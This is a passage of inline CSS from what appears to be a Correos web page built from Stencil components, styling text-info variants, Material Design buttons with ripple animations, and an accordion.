			[variant=features].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item__title.sc-correos-ui-text-inf,
			[variant=download].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item__title.sc-correos-ui-text-inf,
			[variant=prepaid].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item__title.sc-correos-ui-text-inf {
				font-size: 1.125rem;
				line-height: 1.625rem;
				color: var(--_ui-text-inf-color-title);
				text-decoration: none;
				margin-bottom: 8px;
				margin-top: 0
			}

			@media (min-width: 1024px) {

				[variant=features].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item__title.sc-correos-ui-text-inf,
				[variant=download].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item__title.sc-correos-ui-text-inf,
				[variant=prepaid].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item__title.sc-correos-ui-text-inf {
					font-size: 1.5rem;
					line-height: 2.25rem
				}
			}

			[variant=features].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item__title--link.sc-correos-ui-text-inf,
			[variant=download].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item__title--link.sc-correos-ui-text-inf,
			[variant=prepaid].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item__title--link.sc-correos-ui-text-inf {
				text-decoration: underline;
				color: var(--_ui-text-inf-link-color)
			}

			[variant=features].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item__title--bold.sc-correos-ui-text-inf,
			[variant=download].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item__title--bold.sc-correos-ui-text-inf,
			[variant=prepaid].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item__title--bold.sc-correos-ui-text-inf {
				font-weight: bold
			}

			[variant=features].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item__description.sc-correos-ui-text-inf,
			[variant=download].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item__description.sc-correos-ui-text-inf,
			[variant=prepaid].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item__description.sc-correos-ui-text-inf {
				font-size: 1rem;
				line-height: 1.5rem;
				font-weight: lighter;
				margin: 0
			}

			@media (min-width: 1024px) {

				[variant=features].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item__description.sc-correos-ui-text-inf,
				[variant=download].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item__description.sc-correos-ui-text-inf,
				[variant=prepaid].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item__description.sc-correos-ui-text-inf {
					font-size: 1.125rem;
					line-height: 1.875rem
				}
			}

			.sc-correos-ui-text-inf-h[variant=download-links] .sc-correos-ui-text-inf-s>[slot=title] {
				border-bottom: none;
				font-size: 1.5rem;
				line-height: 2.25rem;
				padding-bottom: 0;
				margin-bottom: 24px
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-text-inf-h[variant=download-links] .sc-correos-ui-text-inf-s>[slot=title] {
					font-size: 2rem;
					line-height: 2.75rem
				}
			}

			.sc-correos-ui-text-inf-h[variant=download-links] .sc-correos-ui-text-inf-s>[slot=text] {
				font-size: 1rem
			}

			[variant=download-links].sc-correos-ui-text-inf-h .ui-downloads.sc-correos-ui-text-inf {
				list-style: none;
				padding: 0
			}

			.sc-correos-ui-text-inf-h[variant=minimal] .sc-correos-ui-text-inf-s>[slot=title] {
				font-size: 1.5rem;
				line-height: 2.25rem;
				border-bottom: none;
				margin-bottom: 8px;
				padding-bottom: 0;
				font-weight: normal
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-text-inf-h[variant=minimal] .sc-correos-ui-text-inf-s>[slot=title] {
					font-size: 2rem;
					line-height: 2.75rem
				}
			}

			.sc-correos-ui-text-inf-h[variant=minimal] .sc-correos-ui-text-inf-s>[slot=text] {
				font-size: 0.875rem;
				line-height: 1.375rem
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-text-inf-h[variant=minimal] .sc-correos-ui-text-inf-s>[slot=text] {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-ui-text-inf-h[variant=notifications] .sc-correos-ui-text-inf-s>[slot=title] {
				border-bottom: none;
				font-size: 1.5rem;
				padding-bottom: 0;
				margin-bottom: 12px
			}

			.sc-correos-ui-text-inf-h[variant=notifications] .sc-correos-ui-text-inf-s>[slot=text] {
				font-size: 1rem;
				margin-bottom: 24px
			}

			[variant=pop-up-spa].sc-correos-ui-text-inf-h .ui-footer.sc-correos-ui-text-inf {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-wrap: nowrap;
				flex-wrap: nowrap
			}

			@media (max-width: 639px) {
				[variant=pop-up-spa].sc-correos-ui-text-inf-h .ui-footer.sc-correos-ui-text-inf {
					-ms-flex-wrap: wrap;
					flex-wrap: wrap
				}
			}

			.sc-correos-ui-text-inf-h[variant=prepaid] .sc-correos-ui-text-inf-s>[slot=title] {
				font-size: 1.5rem;
				line-height: 2.25rem;
				border-bottom: none;
				margin-bottom: 16px;
				padding-bottom: 0;
				font-weight: bold
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-text-inf-h[variant=prepaid] .sc-correos-ui-text-inf-s>[slot=title] {
					font-size: 2rem;
					line-height: 2.75rem
				}
			}

			.sc-correos-ui-text-inf-h[variant=prepaid] .sc-correos-ui-text-inf-s>[slot=text] {
				font-size: 1rem;
				line-height: 1.5rem
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-text-inf-h[variant=prepaid] .sc-correos-ui-text-inf-s>[slot=text] {
					font-size: 1.125rem;
					line-height: 1.875rem
				}
			}

			.sc-correos-ui-text-inf-h[variant=prepaid] .sc-correos-ui-text-inf-s>[slot=linkleft] {
				margin-right: 40px
			}
		</style>
		<style>
			.sc-correos-ui-button-apps-h {
				--_ui-button-apps-background-color: var(--ui-button-apps-background-color, white);
				--_ui-button-bg-color: var(--ui-button-secondary-bg-color);
				--_ui-button-bg-color-disabled: var(--ui-button-secondary-bg-color-disabled);
				--_ui-button-bg-color-hover: var(--ui-button-secondary-bg-color-hover);
				--_ui-button-text-color: var(--ui-button-secondary-text-color);
				--_ui-button-border-color: var(--ui-button-secondary-border-color);
				--_ui-button-border: var(--ui-button-secondary-border);
				--_ui-button-border-color-disabled: var(--ui-button-secondary-border-color-disabled);
				--_ui-button-border-radius: var(--ui-button-border-radius, 8px);
				--_ui-button-min-width: var(--ui-button-min-width, 12rem)
			}

			.mdc-touch-target-wrapper.sc-correos-ui-button-apps {
				display: inline
			}

			.mdc-button.sc-correos-ui-button-apps {
				font-family: Roboto, sans-serif;
				-moz-osx-font-smoothing: grayscale;
				-webkit-font-smoothing: antialiased;
				font-size: 0.875rem;
				line-height: 2.25rem;
				font-weight: 500;
				letter-spacing: 0.0892857143em;
				text-decoration: none;
				text-transform: uppercase;
				padding: 0 8px 0 8px;
				display: -ms-inline-flexbox;
				display: inline-flex;
				position: relative;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: center;
				justify-content: center;
				-webkit-box-sizing: border-box;
				box-sizing: border-box;
				min-width: 64px;
				border: none;
				outline: none;
				line-height: inherit;
				-webkit-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
				-webkit-appearance: none;
				overflow: visible;
				vertical-align: middle;
				border-radius: 4px
			}

			.mdc-button.sc-correos-ui-button-apps::-moz-focus-inner {
				padding: 0;
				border: 0
			}

			.mdc-button.sc-correos-ui-button-apps:active {
				outline: none
			}

			.mdc-button.sc-correos-ui-button-apps:hover {
				cursor: pointer
			}

			.mdc-button.sc-correos-ui-button-apps:disabled {
				background-color: transparent;
				color: rgba(0, 0, 0, 0.37);
				cursor: default;
				pointer-events: none
			}

			.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps {
				border-radius: 4px
			}

			.mdc-button.sc-correos-ui-button-apps:not(:disabled) {
				background-color: transparent
			}

			.mdc-button.sc-correos-ui-button-apps .mdc-button__icon.sc-correos-ui-button-apps {
				margin-left: 0;
				margin-right: 8px;
				display: inline-block;
				width: 18px;
				height: 18px;
				font-size: 18px;
				vertical-align: top
			}

			[dir=rtl].sc-correos-ui-button-apps .mdc-button.sc-correos-ui-button-apps .mdc-button__icon.sc-correos-ui-button-apps,
			.mdc-button.sc-correos-ui-button-apps .mdc-button__icon[dir=rtl].sc-correos-ui-button-apps {
				margin-left: 8px;
				margin-right: 0
			}

			.mdc-button.sc-correos-ui-button-apps .mdc-button__touch.sc-correos-ui-button-apps {
				position: absolute;
				top: 50%;
				right: 0;
				left: 0;
				height: 48px;
				-webkit-transform: translateY(-50%);
				transform: translateY(-50%)
			}

			.mdc-button.sc-correos-ui-button-apps:not(:disabled) {
				color: #6200ee;
				color: var(--mdc-theme-primary, #6200ee)
			}

			.mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon.sc-correos-ui-button-apps {
				margin-left: 8px;
				margin-right: 0
			}

			[dir=rtl].sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon.sc-correos-ui-button-apps,
			.mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon[dir=rtl].sc-correos-ui-button-apps {
				margin-left: 0;
				margin-right: 8px
			}

			svg.mdc-button__icon.sc-correos-ui-button-apps {
				fill: currentColor
			}

			.mdc-button--raised.sc-correos-ui-button-apps .mdc-button__icon.sc-correos-ui-button-apps,
			.mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__icon.sc-correos-ui-button-apps,
			.mdc-button--outlined.sc-correos-ui-button-apps .mdc-button__icon.sc-correos-ui-button-apps {
				margin-left: -4px;
				margin-right: 8px
			}

			[dir=rtl].sc-correos-ui-button-apps .mdc-button--raised.sc-correos-ui-button-apps .mdc-button__icon.sc-correos-ui-button-apps,
			.mdc-button--raised.sc-correos-ui-button-apps .mdc-button__icon[dir=rtl].sc-correos-ui-button-apps,
			[dir=rtl].sc-correos-ui-button-apps .mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__icon.sc-correos-ui-button-apps,
			.mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__icon[dir=rtl].sc-correos-ui-button-apps,
			[dir=rtl].sc-correos-ui-button-apps .mdc-button--outlined.sc-correos-ui-button-apps .mdc-button__icon.sc-correos-ui-button-apps,
			.mdc-button--outlined.sc-correos-ui-button-apps .mdc-button__icon[dir=rtl].sc-correos-ui-button-apps {
				margin-left: 8px;
				margin-right: -4px
			}

			.mdc-button--raised.sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon.sc-correos-ui-button-apps,
			.mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon.sc-correos-ui-button-apps,
			.mdc-button--outlined.sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon.sc-correos-ui-button-apps {
				margin-left: 8px;
				margin-right: -4px
			}

			[dir=rtl].sc-correos-ui-button-apps .mdc-button--raised.sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon.sc-correos-ui-button-apps,
			.mdc-button--raised.sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon[dir=rtl].sc-correos-ui-button-apps,
			[dir=rtl].sc-correos-ui-button-apps .mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon.sc-correos-ui-button-apps,
			.mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon[dir=rtl].sc-correos-ui-button-apps,
			[dir=rtl].sc-correos-ui-button-apps .mdc-button--outlined.sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon.sc-correos-ui-button-apps,
			.mdc-button--outlined.sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon[dir=rtl].sc-correos-ui-button-apps {
				margin-left: -4px;
				margin-right: 8px
			}

			.mdc-button--raised.sc-correos-ui-button-apps,
			.mdc-button--unelevated.sc-correos-ui-button-apps {
				padding: 0 16px 0 16px
			}

			.mdc-button--raised.sc-correos-ui-button-apps:disabled,
			.mdc-button--unelevated.sc-correos-ui-button-apps:disabled {
				background-color: rgba(0, 0, 0, 0.12);
				color: rgba(0, 0, 0, 0.37)
			}

			.mdc-button--raised.sc-correos-ui-button-apps:not(:disabled),
			.mdc-button--unelevated.sc-correos-ui-button-apps:not(:disabled) {
				background-color: #6200ee
			}

			@supports not (-ms-ime-align: auto) {

				.mdc-button--raised.sc-correos-ui-button-apps:not(:disabled),
				.mdc-button--unelevated.sc-correos-ui-button-apps:not(:disabled) {
					background-color: var(--mdc-theme-primary, #6200ee)
				}
			}

			.mdc-button--raised.sc-correos-ui-button-apps:not(:disabled),
			.mdc-button--unelevated.sc-correos-ui-button-apps:not(:disabled) {
				color: #fff;
				color: var(--mdc-theme-on-primary, #fff)
			}

			.mdc-button--raised.sc-correos-ui-button-apps {
				-webkit-box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2), 0px 2px 2px 0px rgba(0, 0, 0, 0.14), 0px 1px 5px 0px rgba(0, 0, 0, 0.12);
				box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2), 0px 2px 2px 0px rgba(0, 0, 0, 0.14), 0px 1px 5px 0px rgba(0, 0, 0, 0.12);
				-webkit-transition: -webkit-box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: -webkit-box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1), -webkit-box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1)
			}

			.mdc-button--raised.sc-correos-ui-button-apps:hover,
			.mdc-button--raised.sc-correos-ui-button-apps:focus {
				-webkit-box-shadow: 0px 2px 4px -1px rgba(0, 0, 0, 0.2), 0px 4px 5px 0px rgba(0, 0, 0, 0.14), 0px 1px 10px 0px rgba(0, 0, 0, 0.12);
				box-shadow: 0px 2px 4px -1px rgba(0, 0, 0, 0.2), 0px 4px 5px 0px rgba(0, 0, 0, 0.14), 0px 1px 10px 0px rgba(0, 0, 0, 0.12)
			}

			.mdc-button--raised.sc-correos-ui-button-apps:active {
				-webkit-box-shadow: 0px 5px 5px -3px rgba(0, 0, 0, 0.2), 0px 8px 10px 1px rgba(0, 0, 0, 0.14), 0px 3px 14px 2px rgba(0, 0, 0, 0.12);
				box-shadow: 0px 5px 5px -3px rgba(0, 0, 0, 0.2), 0px 8px 10px 1px rgba(0, 0, 0, 0.14), 0px 3px 14px 2px rgba(0, 0, 0, 0.12)
			}

			.mdc-button--raised.sc-correos-ui-button-apps:disabled {
				-webkit-box-shadow: 0px 0px 0px 0px rgba(0, 0, 0, 0.2), 0px 0px 0px 0px rgba(0, 0, 0, 0.14), 0px 0px 0px 0px rgba(0, 0, 0, 0.12);
				box-shadow: 0px 0px 0px 0px rgba(0, 0, 0, 0.2), 0px 0px 0px 0px rgba(0, 0, 0, 0.14), 0px 0px 0px 0px rgba(0, 0, 0, 0.12)
			}

			.mdc-button--outlined.sc-correos-ui-button-apps {
				border-style: solid;
				padding: 0 15px 0 15px;
				border-width: 1px
			}

			.mdc-button--outlined.sc-correos-ui-button-apps:disabled {
				border-color: rgba(0, 0, 0, 0.37)
			}

			.mdc-button--outlined.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps {
				top: -1px;
				left: -1px;
				border: 1px solid transparent
			}

			.mdc-button--outlined.sc-correos-ui-button-apps:not(:disabled) {
				border-color: #6200ee;
				border-color: var(--mdc-theme-primary, #6200ee)
			}

			.mdc-button--touch.sc-correos-ui-button-apps {
				margin-top: 6px;
				margin-bottom: 6px
			}

			@-webkit-keyframes mdc-ripple-fg-radius-in {
				from {
					-webkit-animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
					animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
					-webkit-transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1);
					transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1)
				}

				to {
					-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
					transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
				}
			}

			@keyframes mdc-ripple-fg-radius-in {
				from {
					-webkit-animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
					animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
					-webkit-transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1);
					transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1)
				}

				to {
					-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
					transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
				}
			}

			@-webkit-keyframes mdc-ripple-fg-opacity-in {
				from {
					-webkit-animation-timing-function: linear;
					animation-timing-function: linear;
					opacity: 0
				}

				to {
					opacity: var(--mdc-ripple-fg-opacity, 0)
				}
			}

			@keyframes mdc-ripple-fg-opacity-in {
				from {
					-webkit-animation-timing-function: linear;
					animation-timing-function: linear;
					opacity: 0
				}

				to {
					opacity: var(--mdc-ripple-fg-opacity, 0)
				}
			}

			@-webkit-keyframes mdc-ripple-fg-opacity-out {
				from {
					-webkit-animation-timing-function: linear;
					animation-timing-function: linear;
					opacity: var(--mdc-ripple-fg-opacity, 0)
				}

				to {
					opacity: 0
				}
			}

			@keyframes mdc-ripple-fg-opacity-out {
				from {
					-webkit-animation-timing-function: linear;
					animation-timing-function: linear;
					opacity: var(--mdc-ripple-fg-opacity, 0)
				}

				to {
					opacity: 0
				}
			}

			.mdc-ripple-surface--test-edge-var-bug.sc-correos-ui-button-apps {
				--mdc-ripple-surface-test-edge-var: 1px solid #000;
				visibility: hidden
			}

			.mdc-ripple-surface--test-edge-var-bug.sc-correos-ui-button-apps::before {
				border: var(--mdc-ripple-surface-test-edge-var)
			}

			.mdc-button.sc-correos-ui-button-apps {
				--mdc-ripple-fg-size: 0;
				--mdc-ripple-left: 0;
				--mdc-ripple-top: 0;
				--mdc-ripple-fg-scale: 1;
				--mdc-ripple-fg-translate-end: 0;
				--mdc-ripple-fg-translate-start: 0;
				-webkit-tap-highlight-color: rgba(0, 0, 0, 0)
			}

			.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
			.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
				position: absolute;
				border-radius: 50%;
				opacity: 0;
				pointer-events: none;
				content: ""
			}

			.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before {
				-webkit-transition: opacity 15ms linear, background-color 15ms linear;
				transition: opacity 15ms linear, background-color 15ms linear;
				z-index: 1
			}

			.mdc-button.mdc-ripple-upgraded.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before {
				-webkit-transform: scale(var(--mdc-ripple-fg-scale, 1));
				transform: scale(var(--mdc-ripple-fg-scale, 1))
			}

			.mdc-button.mdc-ripple-upgraded.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
				top: 0;
				left: 0;
				-webkit-transform: scale(0);
				transform: scale(0);
				-webkit-transform-origin: center center;
				transform-origin: center center
			}

			.mdc-button.mdc-ripple-upgraded--unbounded.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
				top: var(--mdc-ripple-top, 0);
				left: var(--mdc-ripple-left, 0)
			}

			.mdc-button.mdc-ripple-upgraded--foreground-activation.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
				-webkit-animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards;
				animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards
			}

			.mdc-button.mdc-ripple-upgraded--foreground-deactivation.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
				-webkit-animation: mdc-ripple-fg-opacity-out 150ms;
				animation: mdc-ripple-fg-opacity-out 150ms;
				-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
				transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
			}

			.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
			.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
				top: calc(50% - 100%);
				left: calc(50% - 100%);
				width: 200%;
				height: 200%
			}

			.mdc-button.mdc-ripple-upgraded.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
				width: var(--mdc-ripple-fg-size, 100%);
				height: var(--mdc-ripple-fg-size, 100%)
			}

			.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
			.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
				background-color: #6200ee
			}

			@supports not (-ms-ime-align: auto) {

				.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
				.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
					background-color: var(--mdc-theme-primary, #6200ee)
				}
			}

			.mdc-button.sc-correos-ui-button-apps:hover .mdc-button__ripple.sc-correos-ui-button-apps::before {
				opacity: 0.04
			}

			.mdc-button.mdc-ripple-upgraded--background-focused.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
			.mdc-button.sc-correos-ui-button-apps:not(.mdc-ripple-upgraded):focus .mdc-button__ripple.sc-correos-ui-button-apps::before {
				-webkit-transition-duration: 75ms;
				transition-duration: 75ms;
				opacity: 0.12
			}

			.mdc-button.sc-correos-ui-button-apps:not(.mdc-ripple-upgraded) .mdc-button__ripple.sc-correos-ui-button-apps::after {
				-webkit-transition: opacity 150ms linear;
				transition: opacity 150ms linear
			}

			.mdc-button.sc-correos-ui-button-apps:not(.mdc-ripple-upgraded):active .mdc-button__ripple.sc-correos-ui-button-apps::after {
				-webkit-transition-duration: 75ms;
				transition-duration: 75ms;
				opacity: 0.12
			}

			.mdc-button.mdc-ripple-upgraded.sc-correos-ui-button-apps {
				--mdc-ripple-fg-opacity: 0.12
			}

			.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps {
				position: absolute;
				-webkit-box-sizing: content-box;
				box-sizing: content-box;
				width: 100%;
				height: 100%;
				overflow: hidden
			}

			.mdc-button.sc-correos-ui-button-apps:not(.mdc-button--outlined) .mdc-button__ripple.sc-correos-ui-button-apps {
				top: 0;
				left: 0
			}

			.mdc-button--raised.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
			.mdc-button--raised.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after,
			.mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
			.mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
				background-color: #fff
			}

			@supports not (-ms-ime-align: auto) {

				.mdc-button--raised.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
				.mdc-button--raised.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after,
				.mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
				.mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::after {
					background-color: var(--mdc-theme-on-primary, #fff)
				}
			}

			.mdc-button--raised.sc-correos-ui-button-apps:hover .mdc-button__ripple.sc-correos-ui-button-apps::before,
			.mdc-button--unelevated.sc-correos-ui-button-apps:hover .mdc-button__ripple.sc-correos-ui-button-apps::before {
				opacity: 0.08
			}

			.mdc-button--raised.mdc-ripple-upgraded--background-focused.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
			.mdc-button--raised.sc-correos-ui-button-apps:not(.mdc-ripple-upgraded):focus .mdc-button__ripple.sc-correos-ui-button-apps::before,
			.mdc-button--unelevated.mdc-ripple-upgraded--background-focused.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps::before,
			.mdc-button--unelevated.sc-correos-ui-button-apps:not(.mdc-ripple-upgraded):focus .mdc-button__ripple.sc-correos-ui-button-apps::before {
				-webkit-transition-duration: 75ms;
				transition-duration: 75ms;
				opacity: 0.24
			}

			.mdc-button--raised.sc-correos-ui-button-apps:not(.mdc-ripple-upgraded) .mdc-button__ripple.sc-correos-ui-button-apps::after,
			.mdc-button--unelevated.sc-correos-ui-button-apps:not(.mdc-ripple-upgraded) .mdc-button__ripple.sc-correos-ui-button-apps::after {
				-webkit-transition: opacity 150ms linear;
				transition: opacity 150ms linear
			}

			.mdc-button--raised.sc-correos-ui-button-apps:not(.mdc-ripple-upgraded):active .mdc-button__ripple.sc-correos-ui-button-apps::after,
			.mdc-button--unelevated.sc-correos-ui-button-apps:not(.mdc-ripple-upgraded):active .mdc-button__ripple.sc-correos-ui-button-apps::after {
				-webkit-transition-duration: 75ms;
				transition-duration: 75ms;
				opacity: 0.24
			}

			.mdc-button--raised.mdc-ripple-upgraded.sc-correos-ui-button-apps,
			.mdc-button--unelevated.mdc-ripple-upgraded.sc-correos-ui-button-apps {
				--mdc-ripple-fg-opacity: 0.24
			}

			.mdc-button.sc-correos-ui-button-apps {
				height: 36px
			}

			.sc-correos-ui-button-apps-h {
				display: block
			}

			[variant=footer].sc-correos-ui-button-apps-h .ui-img.sc-correos-ui-button-apps {
				height: 40px
			}
		</style>
		<style>
			.sc-correos-ui-accordion-spa-h {
				--_ui-card-accordion-spa-bg-color: var(--ui-card-accordion-spa-bg-color, magenta);
				--_ui-card-accordion-spa-border: 1px solid var(--ui-card-accordion-spa-border-color, green);
				--_ui-card-accordion-spa-border-radius: var(--ui-card-accordion-spa-border-radius, 0px);
				--_ui-card-accordion-spa-box-shadow: 0 10px 20px 0 rgba(0, 0, 0, 0.1);
				--_ui-card-accordion-spa-border-container-top: 1px solid var(--ui-card-accordion-spa-border-color-container-top, red);
				--_ui-card-accordion-spa-border-container: 1.5px solid var(--ui-card-accordion-spa-border-color-container-top, red);
				--_ui-card-accordion-spa-text-color-title: var(--ui-card-accordion-spa-text-color-title, yellow);
				--_ui-card-accordion-spa-text-color-title-dark: var(--ui-card-accordion-spa-text-color-title-dark, yellow);
				--_ui-card-accordion-spa-text-color-body: var(--ui-card-accordion-spa-text-color-body, red);
				--_ui-card-accordion-spa-color-icon: var(--ui-card-accordion-spa-color-icon, purple);
				--_ui-card-accordion-spa-border-bg-title: 1px solid var(--ui-card-accordion-spa-border-bg-title, purple);
				--_ui-card-accordion-spa-box-shadow-bg-title: var(--ui-card-accordion-spa-box-shadow-bg-title)
			}

			.sc-correos-ui-accordion-spa-h {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column;
				background-color: var(--_ui-card-accordion-spa-bg-color);
				border: var(--_ui-card-accordion-spa-border);
				border-radius: var(--_ui-card-accordion-spa-border-radius);
				margin-bottom: 24px
			}

			.sc-correos-ui-accordion-spa-h:hover {
				-webkit-box-shadow: 0 10px 20px 0 rgba(0, 0, 0, 0.2);
				box-shadow: 0 10px 20px 0 rgba(0, 0, 0, 0.2)
			}

			.sc-correos-ui-accordion-spa-h:focus {
				outline: none
			}

			.sc-correos-ui-accordion-spa-h .ui-icon.sc-correos-ui-accordion-spa {
				-webkit-transition: all 0.2s;
				transition: all 0.2s;
				-webkit-transform: rotate(90deg);
				transform: rotate(90deg);
				margin-left: 24px;
				color: var(--_ui-card-accordion-spa-color-icon)
			}

			.sc-correos-ui-accordion-spa-h .transform.sc-correos-ui-accordion-spa {
				-webkit-transition: all 0.2s;
				transition: all 0.2s;
				-webkit-transform: rotate(-90deg);
				transform: rotate(-90deg)
			}

			.sc-correos-ui-accordion-spa-h .ui-header.sc-correos-ui-accordion-spa {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: justify;
				justify-content: space-between;
				padding: 24px;
				cursor: pointer
			}

			.sc-correos-ui-accordion-spa-h .ui-header.sc-correos-ui-accordion-spa:focus {
				outline: none
			}

			.sc-correos-ui-accordion-spa-h .ui-header.focus-visible.sc-correos-ui-accordion-spa .ui-title.sc-correos-ui-accordion-spa {
				text-decoration: underline
			}

			.sc-correos-ui-accordion-spa-h .ui-container.sc-correos-ui-accordion-spa {
				padding-right: 16px
			}

			.sc-correos-ui-accordion-spa-h .ui-content-accordion-spa.sc-correos-ui-accordion-spa {
				opacity: 0;
				visibility: hidden;
				height: 0;
				-webkit-transition: all 0.45s cubic-bezier(0.55, 0.05, 0.05, 0.96);
				transition: all 0.45s cubic-bezier(0.55, 0.05, 0.05, 0.96);
				-webkit-transition-property: opacity;
				transition-property: opacity
			}

